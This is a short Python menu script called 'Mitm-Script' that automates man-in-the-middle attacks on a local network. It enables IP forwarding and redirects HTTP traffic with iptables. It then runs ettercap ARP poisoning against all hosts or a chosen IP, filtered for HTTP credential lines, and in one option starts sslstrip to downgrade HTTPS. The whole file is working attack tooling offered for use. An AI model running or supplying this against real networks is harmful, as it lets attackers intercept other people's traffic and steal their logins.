import os
print(""" \033[36m
 __  __ _ _                  ____            _       _
|  \/  (_) |_ _ __ ___      / ___|  ___ _ __(_)_ __ | |_
| |\/| | | __| '_ ` _ \ ____\___ \ / __| '__| | '_ \| __|
| |  | | | |_| | | | | |_____|__) | (__| |  | | |_) | |_
|_|  |_|_|\__|_| |_| |_|    |____/ \___|_|  |_| .__/ \__|
                                              |_|

""")
print("\033[37m By Julian Pedro F. Braga \n")

print ("(1) - Mitm all hosts")
print ("(2) - Mitm set host")
print ("(0) - Close")

option =(int(input("Set option: ")))
if option == 1:
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 4003")
    os.system("ettercap -TqM ARP:REMOTE //// | grep 'HTTP : ' ")
    os.system("sslstrip -a -l 4003" )

elif option == 2:
    host = input("Set IP HOST: ")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 4003")
    os.system("ettercap -TqM ARP:REMOTE //"+host+"/ | grep 'HTTP : ' ")

elif option == 0:
    print("Thank you.Goodbye")
    quit()

else:
    print("Digite uma opção válida.Ex: 1 ")
    quit()

